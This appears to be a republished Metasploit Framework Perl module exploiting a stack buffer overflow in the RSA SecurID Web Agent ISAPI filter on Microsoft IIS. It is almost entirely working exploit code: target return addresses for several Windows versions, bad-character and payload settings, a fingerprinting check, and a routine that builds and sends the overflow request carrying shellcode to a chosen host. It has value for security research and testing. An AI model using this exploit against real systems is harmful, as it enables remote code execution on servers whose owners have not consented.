MS Windows IIS SA WebAgent 5.2/5.3 Redirect Overflow Exploit (meta)
===================================================================

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::rsa_iiswebagent_redirect;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };

my $info =
  {
	&#039;Name&#039;  => &#039;IIS RSA WebAgent Redirect Overflow&#039;,
	&#039;Version&#039;  => &#039;$Revision: 1.4 $&#039;,
	&#039;Authors&#039; => [ &#039;H D Moore <hdm [at] metasploit.com>&#039;, ],
	&#039;Arch&#039;  => [ &#039;x86&#039; ],
	&#039;OS&#039;    => [ &#039;win32&#039; ],
	&#039;Priv&#039;  => 0,
	&#039;UserOpts&#039;  =>
	  {
		&#039;RHOST&#039; => [1, &#039;ADDR&#039;, &#039;The target address&#039;],
		&#039;RPORT&#039; => [1, &#039;PORT&#039;, &#039;The target port&#039;, 80],
		&#039;SSL&#039;   => [0, &#039;BOOL&#039;, &#039;Use SSL&#039;],
		&#039;URL&#039;   => [1, &#039;DATA&#039;, &#039;The path to the DLL&#039;, &#039;/WebID/IISWebAgentIF.dll&#039;],
	  },

	&#039;Payload&#039; =>
	  {
		&#039;Space&#039;     => 1024,
		&#039;BadChars&#039;  => 
						"\x00\x09\x0a\x0b\x0d\x20\x22\x23\x25\x26\x27\x2b\x2f".
						"\x3a\x3b\x3c\x3d\x3e\x3f\x40\x5c". "Z",
						
		&#039;Prepend&#039;   => "\x81\xc4\x54\xf2\xff\xff",
		&#039;Keys&#039;      => [&#039;+ws2ord&#039;],
	  },

	&#039;Description&#039;  => Pex::Text::Freeform(qq{
		This module exploits a stack overflow in the SecurID Web Agent for IIS.
	This ISAPI filter runs in-process with inetinfo.exe, any attempt to
	exploit this flaw will result in the termination and potential restart
	of the IIS service.
}),

	&#039;Refs&#039;  =>
	  [
	  	# Anyone got a patch/advisory/solution URL?
	  ],
	  
	&#039;Targets&#039; =>
	  [
	  	# Version-specific return addresses
		[&#039;RSA WebAgent 5.2&#039;, 996, 0x1001e694],
		[&#039;RSA WebAgent 5.3&#039;, 992, 0x10010e89],
		
		# Generic return addresses
		[&#039;RSA WebAgent 5.2 on Windows 2000 English&#039;, 996, 0x75022ac4],
		[&#039;RSA WebAgent 5.3 on Windows 2000 English&#039;, 992, 0x75022ac4],
		
		[&#039;RSA WebAgent 5.2 on Windows XP SP0-SP1 English&#039;, 996, 0x71ab1d54],
		[&#039;RSA WebAgent 5.3 on Windows XP SP0-SP1 English&#039;, 992, 0x71ab1d54],
		
		[&#039;RSA WebAgent 5.2 on Windows XP SP2 English&#039;, 996, 0x71ab9372],
		[&#039;RSA WebAgent 5.3 on Windows XP SP2 English&#039;, 992, 0x71ab9372],
		
		[&#039;RSA WebAgent 5.2 on Windows 2003 English SP0&#039;, 996, 0x7ffc0638],
		[&#039;RSA WebAgent 5.3 on Windows 2003 English SP0&#039;, 992, 0x7ffc0638],

	  ],

	&#039;Keys&#039; => [&#039;rsa&#039;],
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({&#039;Info&#039; => $info, &#039;Advanced&#039; => $advanced}, @_);
	return($self);
}

sub Check {
	my $self = shift;
	my $target_host = $self->GetVar(&#039;RHOST&#039;);
	my $target_port = $self->GetVar(&#039;RPORT&#039;);

	my $s = Msf::Socket::Tcp->new
	  (
		&#039;PeerAddr&#039;  => $target_host,
		&#039;PeerPort&#039;  => $target_port,
		&#039;LocalPort&#039; => $self->GetVar(&#039;CPORT&#039;),
		&#039;SSL&#039;       => $self->GetVar(&#039;SSL&#039;),
	  );
	if ($s->IsError) {
		$self->PrintLine(&#039;[*] Error creating socket: &#039; . $s->GetError);
		return $self->CheckCode(&#039;Connect&#039;);
	}

	$s->Send("GET ".$self->GetVar(&#039;URL&#039;)."?GetPic?image=msf HTTP/1.1\r\nHost: $target_host:$target_port\r\n\r\n");

	my $r = $s->Recv(-1, 5);

	if ($r =~ /RSA Web Access Authentication/)
	{
		$self->PrintLine("[*] Found IISWebAgentIF.dll ;)");
		return $self->CheckCode(&#039;Detected&#039;);
	} else {

		$self->PrintLine("The IISWebAgentIF.dll ISAPI does not appear to be installed");
		return $self->CheckCode(&#039;Safe&#039;);
	}
}

sub Exploit {
	my $self = shift;
	my $target_host = $self->GetVar(&#039;RHOST&#039;);
	my $target_port = $self->GetVar(&#039;RPORT&#039;);
	my $target_idx  = $self->GetVar(&#039;TARGET&#039;);
	my $shellcode   = $self->GetVar(&#039;EncodedPayload&#039;)->Payload;
	my $target      = $self->Targets->[ $target_idx ];

	$self->PrintLine("[*] Attempting to exploit target ".$target->[0]);


	my $pattern = Pex::Text::AlphaNumText(8192);
	# Just don&#039;t ask.
	$pattern =~ s/\d|Z/A/ig;
	
	substr($pattern, $target->[1]    , 4, pack(&#039;V&#039;, $target->[2]));
	substr($pattern, $target->[1] - 4, 2, "\xeb\x06");
	substr($pattern, $target->[1] + 4, length($shellcode), $shellcode);

	my $request =
	  "GET ".$self->GetVar(&#039;URL&#039;)."?Redirect?url=$pattern HTTP/1.1\r\n".
	  "Host: $target_host:$target_port\r\n\r\n";

	my $s = Msf::Socket::Tcp->new
	  (
		&#039;PeerAddr&#039;  => $target_host,
		&#039;PeerPort&#039;  => $target_port,
		&#039;LocalPort&#039; => $self->GetVar(&#039;CPORT&#039;),
		&#039;SSL&#039;       => $self->GetVar(&#039;SSL&#039;),
	  );
	if ($s->IsError) {
		$self->PrintLine(&#039;[*] Error creating socket: &#039; . $s->GetError);
		return;
	}

	$self->PrintLine("[*] Sending " .length($request) . " bytes to remote host.");
	$s->Send($request);

	$self->PrintLine("[*] Waiting for a response...");
	$s->Recv(-1, 10);
	$self->Handler($s);
	$s->Close();
	return;
}


